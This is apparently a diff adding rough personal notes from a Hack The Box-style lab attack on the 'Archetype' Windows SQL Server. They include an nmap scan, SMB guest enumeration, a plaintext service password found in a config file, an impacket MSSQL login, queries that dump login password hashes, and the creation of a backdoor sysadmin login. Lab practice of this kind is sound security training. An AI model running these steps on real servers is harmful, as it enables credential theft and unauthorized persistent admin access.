@@ -1,0 +1,162 @@
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 09:14 CDT
+Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 09:15 (0:00:21 remaining)
+Nmap scan report for 10.129.118.61
+Host is up (0.0086s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-10-18T14:10:38
+|_Not valid after:  2054-10-18T14:10:38
+|_ssl-date: 2024-10-18T14:15:23+00:00; 0s from scanner time.
+| ms-sql-ntlm-info: 
+|   10.129.118.61:1433: 
+|     Target_Name: ARCHETYPE
+|     NetBIOS_Domain_Name: ARCHETYPE
+|     NetBIOS_Computer_Name: ARCHETYPE
+|     DNS_Domain_Name: Archetype
+|     DNS_Computer_Name: Archetype
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.129.118.61:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-10-18T14:15:15
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-10-18T07:15:17-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
+
+smbclient -U 'guest' -L \\$target
+smbclient -N -L \\\\{TARGET_IP}\\ #same
+
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>
+
+#Get impacket if needed
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
+# OR:
+sudo python3 setup.py install
+# In case you are missing some modules:
+pip3 install -r requirements.txt
+
+wrong
+
+#use windows auth... how to know
+mssqlclient.py ARCHETYPE/sql_svc@$target -windows-auth
+
+# Get version
+select @@version;
+
+Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
+	Aug 22 2017 17:04:49 
+	Copyright (C) 2017 Microsoft Corporation
+	Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+
+# Get user
+select user_name();
+
+?
+
+# Get databases
+SELECT name FROM master.dbo.sysdatabases;
+
+master, tempdb, model, msdb
+
+# Use database
+USE master
+
+#Get table names
+SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
+SELECT * FROM INFORMATION_SCHEMA.TABLES;
+
+spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_values, spt_monitor, MSreplication_options
+
+#List Linked Servers
+EXEC sp_linkedservers
+SELECT * FROM sys.servers;
+#List users
+select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+
+| Login                                     | Type                    | Hash                                                                                                                         | Created                  | Modified                 | Status   |
+|-------------------------------------------|-------------------------|------------------------------------------------------------------------------------------------------------------------------|--------------------------|--------------------------|----------|
+| ##MS_AgentSigningCertificate              | CERTIFICATE_MAPPED_LOGIN| NULL                                                                                                                         | 2017-08-22 19:39:35      | 2017-08-22 19:39:35      | Enabled  |
+| ##MS_PolicyEventProcessingLogin           | SQL_LOGIN               | b'02003d1be73b4e8454e737ed6b68096e53a810f2ff98dc50df96a240f5b560aebdafcbf6c2db0cab31ad1b1f2af285b3659a6d5479de875380b8100a34882ad7748438985cae' | 2017-08-22 19:39:30      | 2020-01-19 15:10:07      | Disabled |
+| ##MS_PolicySigningCertificate             | CERTIFICATE_MAPPED_LOGIN| NULL                                                                                                                         | 2017-08-22 19:39:07      | 2017-08-22 19:39:07      | Enabled  |
+| ##MS_PolicyTsqlExecutionLogin             | SQL_LOGIN               | b'0200b21fd125bfc51840773537c9389ba510dddede01db01a45dbea30a74cb34a3b84fb7fa54c60d7f5c7e71813f50182f6ad974c7ab3cd077ca1bea8e1e65979b6d9e1cb223' | 2017-08-22 19:39:30      | 2020-01-19 15:10:07      | Disabled |
+| ##MS_SmoExtendedSigningCertificate        | CERTIFICATE_MAPPED_LOGIN| NULL                                                                                                                         | 2017-08-22 19:39:07      | 2017-08-22 19:39:07      | Enabled  |
+| ##MS_SQLAuthenticatorCertificate           | CERTIFICATE_MAPPED_LOGIN| NULL                                                                                                                         | 2017-08-22 19:39:07      | 2017-08-22 19:39:07      | Enabled  |
+| ##MS_SQLReplicationSigningCertificate      | CERTIFICATE_MAPPED_LOGIN| NULL                                                                                                                         | 2017-08-22 19:39:07      | 2017-08-22 19:39:07      | Enabled  |
+| ##MS_SQLResourceSigningCertificate         | CERTIFICATE_MAPPED_LOGIN| NULL                                                                                                                         | 2017-08-22 19:39:07      | 2017-08-22 19:39:07      | Enabled  |
+| ARCHETYPE\sql_svc                         | WINDOWS_LOGIN           | NULL                                                                                                                         | 2020-01-19 15:10:07      | 2020-01-19 15:10:07      | Enabled  |
+| hacker                                     | SQL_LOGIN               | b'02007f4ca81813c73a98aa5fd08362876c3e9f8401f2e7471f6da4a2a8c31aa1434827631ee49a364b65c4f859ae6d589157b10f9055ae312eabac095874d4710caf8c8d07cf' | 2024-10-18 08:22:07      | 2024-10-18 08:22:08      | Enabled  |
+| NT AUTHORITY\SYSTEM                       | WINDOWS_LOGIN           | NULL                                                                                                                         | 2020-01-19 15:10:07      | 2020-01-19 15:10:07      | Enabled  |
+| NT SERVICE\MSSQLSERVER                    | WINDOWS_LOGIN           | NULL                                                                                                                         | 2020-01-19 15:10:07      | 2020-01-19 15:10:07      | Enabled  |
+| NT SERVICE\SQLSERVERAGENT                 | WINDOWS_LOGIN           | NULL                                                                                                                         | 2020-01-19 15:10:07      | 2020-01-19 15:10:07      | Enabled  |
+| NT SERVICE\SQLTELEMETRY                   | WINDOWS_LOGIN           | NULL                                                                                                                         | 2020-01-19 15:10:08      | 2020-01-19 15:10:08      | Enabled  |
+| NT SERVICE\SQLWriter                       | WINDOWS_LOGIN           | NULL                                                                                                                         | 2020-01-19 15:10:07      | 2020-01-19 15:10:07      | Enabled  |
+| NT SERVICE\Winmgmt                        | WINDOWS_LOGIN           | NULL                                                                                                                         | 2020-01-19 15:10:07      | 2020-01-19 15:10:07      | Enabled  |
+| sa                                         | SQL_LOGIN               | b'0200100bac9600580c3c299ed7ff81d77bcbe50b830ca60306d7a5e5bf34a5c6be0d895247952bfff5708764033a797e8ca4f2004797203d7ee5c794d655c3218a0b13a3ce63' | 2003-04-08 09:10:35      | 2020-01-19 15:10:07      | Disabled |
+
+
+#Create user with sysadmin privs
+CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
+EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
+
+#check right to xp_cmdshell
+Use master
+EXEC sp_helprotect 'xp_cmdshell' #no matching rows
+
+
+
+
+
+    
+
+
+
